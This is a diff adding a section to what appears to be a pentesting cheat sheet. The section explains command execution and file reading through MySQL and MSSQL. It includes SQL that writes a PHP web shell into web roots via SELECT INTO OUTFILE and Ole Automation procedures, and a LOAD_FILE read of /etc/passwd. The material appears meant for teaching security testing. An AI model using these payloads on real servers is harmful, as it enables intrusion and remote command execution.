@@ -146,3 +146,70 @@ user()
 # Show current database
 database()
 ```
+
+## Command execution
+
+### Writing files
+
+`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys).
+
+`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. 
+
+- If `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET, having  the appropriate privileges, attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. 
+- Browse to the location where the file is and execute the commands.
+
+```mysql
+ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+- In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
+- Settings in the `secure_file_priv`:
+	- If empty, the variable has no effect, which is not a secure setting as we can read and write data using `MySQL`:
+		
+		```mysql
+		show variables like "secure_file_priv";
+		```
+
+```shell-session
+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+```
+
+```cmd-session
+# To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
+
+sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE;
+
+# Using MSSQL to Create a File
+DECLARE @OLE INT;
+DECLARE @FileID INT;
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
+EXECUTE sp_OADestroy @FileID;
+EXECUTE sp_OADestroy @OLE;
+
+```
+
+- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+- If set to NULL, the server disables import and export operations.
+
+
+### Reading files
+
+#### MySQL - Read Local Files in MySQL
+
+If permissions allows it:
+
+```shell-session
+select LOAD_FILE("/etc/passwd");
+```
+
+
